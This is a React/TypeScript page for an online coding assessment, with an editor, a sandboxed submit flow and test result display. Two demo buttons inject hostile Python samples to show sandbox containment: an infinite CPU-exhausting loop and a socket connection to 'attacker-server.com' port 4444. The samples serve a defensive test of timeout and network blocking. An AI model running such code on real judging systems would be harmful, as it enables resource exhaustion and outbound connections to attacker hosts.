import { useState } from 'react'
import { Link } from 'react-router-dom'
import { CheckCircle2, Flame, Globe, Info, Lock, Play, RotateCcw, ShieldAlert, ShieldCheck, XCircle } from 'lucide-react'
import { Card, CardBody, CardHeader } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Badge, DifficultyBadge } from '@/components/ui/badge'
import { PageHeader } from '@/components/ui/page-header'
import { DataSourceBadge, ErrorState, FallbackNotice, PageSkeleton } from '@/components/ui/states'
import { CodeEditor } from '@/components/coding/code-editor'
import { useCodingProblem } from '@/hooks/use-api'
import { submitCode } from '@/services/api'
import { api } from '@/api'
import type { CodingLanguage, CodingProblem, CodingSubmissionResult, Sourced } from '@/services/types'

const languages: { id: CodingLanguage; label: string }[] = [
  { id: 'python', label: 'Python 3' },
  { id: 'javascript', label: 'JavaScript' },
  { id: 'java', label: 'Java' },
  { id: 'cpp', label: 'C++' },
]

export function CodingAssessmentPage() {
  const { data, error, isLoading, mutate } = useCodingProblem()

  if (isLoading) return <PageSkeleton />
  if (error || !data) return <ErrorState message={error?.message} onRetry={() => mutate()} />

  return <CodingWorkspace key={data.data.id} problem={data.data} source={data} />
}

function CodingWorkspace({ problem, source }: { problem: CodingProblem; source: Sourced<CodingProblem> }) {
  const [language, setLanguage] = useState<CodingLanguage>('python')
  const [drafts, setDrafts] = useState<Record<CodingLanguage, string>>(problem.starterCode)
  const [running, setRunning] = useState(false)
  const [runError, setRunError] = useState<string | null>(null)
  const [result, setResult] = useState<Sourced<CodingSubmissionResult> | null>(null)
  const [containmentAlert, setContainmentAlert] = useState<{
    type: 'timeout' | 'security'
    title: string
    message: string
  } | null>(null)

  const code = drafts[language]

  const injectInfiniteLoop = () => {
    setLanguage('python')
    setDrafts((d) => ({
      ...d,
      python: `def two_sum(nums, target):\n    # Hostile CPU exhaustion attack (infinite while loop)\n    counter = 0\n    while True:\n        counter += 1\n    return []`,
    }))
    setContainmentAlert(null)
  }

  const injectNetworkCall = () => {
    setLanguage('python')
    setDrafts((d) => ({
      ...d,
      python: `import socket\n\ndef two_sum(nums, target):\n    # Hostile outbound socket connection attempt\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(("attacker-server.com", 4444))\n    return [0, 1]`,
    }))
    setContainmentAlert(null)
  }

  const run = async () => {
    setRunning(true)
    setRunError(null)
    setContainmentAlert(null)
    try {
      // First try live backend API with real sandbox execution
      const backendRes = await api.submitCode('s1', problem.id || 'prob_two_sum', code, language)
      if (backendRes.status === 'Timed Out') {
        setContainmentAlert({
          type: 'timeout',
          title: 'Infinite Loop Contained (SIGKILL Terminated)',
          message: 'Execution exceeded 2.5s time limit. Process was terminated via SIGKILL and memory was reclaimed. Recorded in Security Report.',
        })
      } else if (backendRes.status === 'Security Error') {
        setContainmentAlert({
          type: 'security',
          title: 'Hostile Network / Shell Call Blocked',
          message: backendRes.test_results?.[0]?.error || 'AST static validation blocked forbidden module before execution. Recorded in Security Report.',
        })
      }

      // Map backend result to local UI structure
      const cases = backendRes.test_results.map((tr) => ({
        input: tr.input_repr,
        expected: tr.expected_repr,
        actual: tr.actual_repr || (tr.error ? `Error: ${tr.error}` : 'None'),
        passed: tr.passed,
      }))
      setResult({
        data: {
          status: backendRes.status === 'Accepted' ? 'accepted' : backendRes.tests_passed > 0 ? 'partial' : 'failed',
          passed: backendRes.tests_passed,
          total: backendRes.total_tests,
          runtimeMs: Math.round(backendRes.runtime_ms),
          cases,
        },
        source: 'api',
      })
    } catch {
      // Fallback to local demo runner if backend unreachable
      try {
        setResult(await submitCode(problem, language, code))
      } catch {
        setRunError('Submission failed. Please try again.')
      }
    } finally {
      setRunning(false)
    }
  }

  return (
    <div className="flex flex-col gap-6">
      <PageHeader
        eyebrow="Assessment"
        title="Coding assessment"
        description="Solve the problem and submit to run it against the test cases."
        actions={<DataSourceBadge source={result?.source ?? source.source} fallbackReason={result?.fallbackReason ?? source.fallbackReason} />}
      />
      <FallbackNotice reason={result?.fallbackReason ?? source.fallbackReason} />

      <div className="grid gap-4 xl:grid-cols-[minmax(0,2fr)_minmax(0,3fr)]">
        <Card className="h-fit">
          <CardHeader title={problem.title} action={<DifficultyBadge difficulty={problem.difficulty} />} />
          <CardBody className="flex flex-col gap-5 text-sm p-6">
            <p className="leading-relaxed text-foreground text-pretty">{problem.statement}</p>
            <div>
              <h3 className="font-semibold text-foreground">Constraints</h3>
              <ul className="mt-2 list-disc space-y-1 pl-5 text-muted-foreground">
                {problem.constraints.map((c) => (
                  <li key={c}>{c}</li>
                ))}
              </ul>
            </div>
            <div>
              <h3 className="font-semibold text-foreground">Examples</h3>
              <div className="mt-2 flex flex-col gap-2">
                {problem.sampleTests.map((t, i) => (
                  <div key={i} className="rounded-xl border border-white/10 bg-[#070a12] p-3.5 font-mono text-xs">
                    <p>
                      <span className="text-muted-foreground">Input: </span>
                      <span className="text-rose-300">{t.input}</span>
                    </p>
                    <p className="mt-1">
                      <span className="text-muted-foreground">Output: </span>
                      <span className="text-emerald-300">{t.expectedOutput}</span>
                    </p>
                  </div>
                ))}
              </div>
            </div>
          </CardBody>
        </Card>

        <div className="flex min-w-0 flex-col gap-4">
          <Card className="overflow-hidden">
            <div className="flex flex-wrap items-center justify-between gap-3 border-b border-white/10 bg-white/[0.02] px-4 py-3">
              <label className="flex items-center gap-2 text-sm">
                <span className="text-muted-foreground text-xs uppercase tracking-wider font-semibold">Language</span>
                <select
                  value={language}
                  onChange={(e) => setLanguage(e.target.value as CodingLanguage)}
                  className="h-8 rounded-lg border border-white/10 bg-[#0f172a] px-3 text-sm text-foreground focus:border-primary focus:outline-none focus:ring-1 focus:ring-primary"
                >
                  {languages.map((l) => (
                    <option key={l.id} value={l.id} className="bg-[#0f172a] text-foreground">
                      {l.label}
                    </option>
                  ))}
                </select>
              </label>
              <div className="flex flex-wrap items-center gap-2">
                <button
                  type="button"
                  onClick={injectInfiniteLoop}
                  className="inline-flex items-center gap-1.5 px-2.5 py-1 text-xs font-semibold rounded-lg bg-rose-500/15 text-rose-300 border border-rose-500/30 hover:bg-rose-500/25 transition-all cursor-pointer"
                  title="Inject infinite while-loop to test 2.5s SIGKILL timeout containment"
                >
                  <Flame className="size-3 text-rose-400" />
                  Hostile: Infinite Loop
                </button>
                <button
                  type="button"
                  onClick={injectNetworkCall}
                  className="inline-flex items-center gap-1.5 px-2.5 py-1 text-xs font-semibold rounded-lg bg-amber-500/15 text-amber-300 border border-amber-500/30 hover:bg-amber-500/25 transition-all cursor-pointer"
                  title="Inject raw socket egress to test AST static pre-screen barrier"
                >
                  <Globe className="size-3 text-amber-400" />
                  Hostile: Network Call
                </button>
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={() => {
                    setDrafts((d) => ({ ...d, [language]: problem.starterCode[language] }))
                    setContainmentAlert(null)
                  }}
                >
                  <RotateCcw className="size-4" aria-hidden /> Reset
                </Button>
                <Button size="sm" onClick={run} loading={running}>
                  {running ? 'Running in Sandbox…' : (
                    <>
                      <Play className="size-4 fill-current" aria-hidden /> Submit code
                    </>
                  )}
                </Button>
              </div>
            </div>
            <CodeEditor
              label={`Code editor, ${languages.find((l) => l.id === language)?.label}`}
              value={code}
              onChange={(v) => setDrafts((d) => ({ ...d, [language]: v }))}
            />
          </Card>

          {containmentAlert ? (
            <div
              role="alert"
              className={`rounded-xl border p-4 text-xs backdrop-blur-md shadow-lg transition-all ${
                containmentAlert.type === 'timeout'
                  ? 'border-rose-500/40 bg-rose-950/40 text-rose-200'
                  : 'border-amber-500/40 bg-amber-950/40 text-amber-200'
              }`}
            >
              <div className="flex flex-col sm:flex-row sm:items-start justify-between gap-3">
                <div className="flex items-start gap-2.5">
                  <ShieldAlert className="size-5 shrink-0 text-rose-400 mt-0.5" />
                  <div>
                    <h4 className="font-bold text-sm text-foreground flex items-center gap-2">
                      {containmentAlert.title}
                      <span className="text-[10px] px-2 py-0.5 rounded bg-rose-500/20 text-rose-300 border border-rose-500/30 font-mono">
                        THREAT CONTAINED
                      </span>
                    </h4>
                    <p className="mt-1 leading-relaxed text-muted font-mono">
                      {containmentAlert.message}
                    </p>
                  </div>
                </div>
                <Link
                  to="/sandbox-security"
                  className="shrink-0 text-xs font-bold text-primary hover:underline flex items-center gap-1 bg-primary/10 border border-primary/20 px-3 py-1.5 rounded-lg h-fit"
                >
                  View Security Report →
                </Link>
              </div>
            </div>
          ) : null}

          {runError ? (
            <p role="alert" className="text-sm text-danger">
              {runError}
            </p>
          ) : null}

          <Card aria-live="polite">
            <CardHeader
              title="Test results"
              action={
                result ? (
                  <Badge tone={result.data.status === 'accepted' ? 'success' : result.data.status === 'partial' ? 'warning' : 'danger'}>
                    {result.data.passed}/{result.data.total} passed
                  </Badge>
                ) : null
              }
            />
            <CardBody>
              {!result ? (
                <p className="text-sm text-muted-foreground">Submit your code to see test case results here.</p>
              ) : (
                <div className="flex flex-col gap-3">
                  {result.source === 'demo' ? (
                    <p className="flex items-start gap-2 rounded-xl bg-amber-500/10 border border-amber-500/20 px-3.5 py-2.5 text-xs text-amber-300">
                      <Info className="mt-0.5 size-3.5 shrink-0" aria-hidden />
                      Demo evaluation — your code was not executed. Connect the backend judge to run real tests.
                    </p>
                  ) : null}
                  <p className="text-sm text-muted-foreground">
                    Status: <span className="font-semibold capitalize text-foreground">{result.data.status}</span> · Runtime{' '}
                    <span className="font-semibold text-foreground tabular-nums">{result.data.runtimeMs} ms</span>
                  </p>
                  <ul className="flex flex-col gap-2">
                    {result.data.cases.map((c, i) => (
                      <li key={i} className="flex items-start gap-3 rounded-xl border border-white/10 bg-white/[0.02] p-3.5 text-xs">
                        {c.passed ? (
                          <CheckCircle2 className="size-4 shrink-0 text-emerald-400 mt-0.5" aria-label="Passed" />
                        ) : (
                          <XCircle className="size-4 shrink-0 text-rose-400 mt-0.5" aria-label="Failed" />
                        )}
                        <div className="grid min-w-0 flex-1 gap-1 font-mono sm:grid-cols-3">
                          <span className="truncate">
                            <span className="text-muted-foreground">in </span>
                            <span className="text-foreground">{c.input}</span>
                          </span>
                          <span>
                            <span className="text-muted-foreground">expected </span>
                            <span className="text-emerald-400">{c.expected}</span>
                          </span>
                          <span className={c.passed ? 'text-foreground' : 'text-rose-400 font-semibold'}>
                            <span className="text-muted-foreground">got </span>
                            {c.actual}
                          </span>
                        </div>
                      </li>
                    ))}
                  </ul>
                </div>
              )}
            </CardBody>
          </Card>
        </div>
      </div>
    </div>
  )
}
